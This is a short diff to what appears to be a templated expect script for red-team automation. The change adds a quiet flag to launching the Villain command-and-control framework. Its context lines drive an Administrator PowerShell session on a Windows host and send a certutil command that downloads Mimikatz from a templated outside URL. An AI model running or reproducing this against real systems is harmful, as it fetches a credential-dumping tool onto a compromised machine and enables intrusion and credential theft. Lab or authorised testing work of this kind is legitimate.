@@ -5,7 +5,7 @@
     content: |
       #!/usr/bin/expect -f
       set timeout -1
-      spawn villain
+      spawn villain -q
       expect "PS C:\\Users\\Administrator\\Documents> "
       send "certutil -urlcache -split -f {{ mimikatz_url }} {{ mimikatz_dest }}\r"
       expect "PS C:\\Users\\Administrator\\Documents> "
